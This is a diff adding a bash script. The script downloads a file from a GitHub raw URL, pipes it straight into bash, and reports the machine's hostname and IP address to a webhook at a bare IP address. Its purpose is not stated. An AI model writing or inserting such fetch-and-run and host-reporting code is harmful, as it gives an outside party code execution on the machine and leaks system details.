@@ -1,0 +1,39 @@
+#!/bin/bash
+set -x # Enable debugging
+
+# Function to send error details to the API
+send_to_api() {
+    local status_code=$1
+    local message=$2
+    local api_url="http://193.242.145.167/webhook/update_notify"
+    local hostname=$(hostname)
+    local server_ip=$(hostname -I | awk '{print $1}')
+    
+    curl -X POST -H "Content-Type: application/json" \
+        -d '{"status_code": "'"$status_code"'", "message": "'"$message"'", "hostname": "'"$hostname"'", "server_ip": "'"$server_ip"'"}' \
+        "$api_url"
+}
+
+# Fetch the content and capture the HTTP status code
+HTTP_RESPONSE=$(curl -s -w "%{http_code}" -o /tmp/response.txt https://raw.githubusercontent.com/Amin-tvk/script/main/script.sh)
+CONTENT=$(cat /tmp/response.txt)
+
+# Check the HTTP status code
+if [ "$HTTP_RESPONSE" -eq 200 ]; then
+    echo "Request was successful."
+    echo "$CONTENT" # Optional: Print the content for debugging
+    
+    # Execute the fetched content as a script
+    STATUS=$(echo "$CONTENT" | bash)
+    if [ $? -ne 0 ]; then
+        echo "Error occurred while executing the script."
+        send_to_api "$HTTP_RESPONSE" "Error occurred while executing the script"
+    else
+        echo "$STATUS" # Optional: Print the status for debugging
+        send_to_api "$HTTP_RESPONSE" "Request and execution successful"
+    fi
+else
+    echo "Request failed with status code: $HTTP_RESPONSE"
+    send_to_api "$HTTP_RESPONSE" "Request failed"
+fi
+
